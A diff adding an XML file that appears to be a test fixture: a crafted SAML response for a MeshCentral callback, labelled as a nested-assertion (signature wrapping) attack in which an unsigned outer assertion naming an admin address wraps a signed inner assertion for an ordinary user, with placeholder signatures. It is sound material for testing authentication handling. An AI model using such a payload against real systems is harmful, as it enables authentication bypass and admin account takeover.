@@ -1,0 +1,55 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- VECTOR: Nested assertion (assertion wrapping) — outer assertion unsigned/attacker-controlled, inner assertion signed; XPath depth or first() vs descendant:: divergence -->
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
+                xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
+                ID="_nested001"
+                Version="2.0"
+                IssueInstant="2026-01-01T00:00:00Z"
+                Destination="https://meshcentral.example.com/auth-saml-callback">
+  <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
+  <samlp:Status>
+    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
+  </samlp:Status>
+  <!-- Outer (evil) assertion wraps the inner signed assertion -->
+  <saml:Assertion ID="_assertion_outer_evil" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
+    <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
+    <saml:Subject>
+      <!-- Attacker's desired nameID in outer assertion -->
+      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@corp.com</saml:NameID>
+      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
+                                      Recipient="https://meshcentral.example.com/auth-saml-callback"/>
+      </saml:SubjectConfirmation>
+    </saml:Subject>
+    <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
+      <saml:AudienceRestriction>
+        <saml:Audience>meshcentral</saml:Audience>
+      </saml:AudienceRestriction>
+    </saml:Conditions>
+    <!-- Inner signed assertion with legitimate user -->
+    <saml:Assertion ID="_assertion_inner_good" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
+      <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
+      <ds:Signature>
+        <ds:SignedInfo>
+          <ds:Reference URI="#_assertion_inner_good">
+            <ds:DigestValue>PLACEHOLDER_INNER_DIGEST</ds:DigestValue>
+          </ds:Reference>
+        </ds:SignedInfo>
+        <ds:SignatureValue>PLACEHOLDER_INNER_SIG</ds:SignatureValue>
+      </ds:Signature>
+      <saml:Subject>
+        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user@corp.com</saml:NameID>
+        <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+          <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
+                                        Recipient="https://meshcentral.example.com/auth-saml-callback"/>
+        </saml:SubjectConfirmation>
+      </saml:Subject>
+      <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
+        <saml:AudienceRestriction>
+          <saml:Audience>meshcentral</saml:Audience>
+        </saml:AudienceRestriction>
+      </saml:Conditions>
+    </saml:Assertion>
+  </saml:Assertion>
+</samlp:Response>
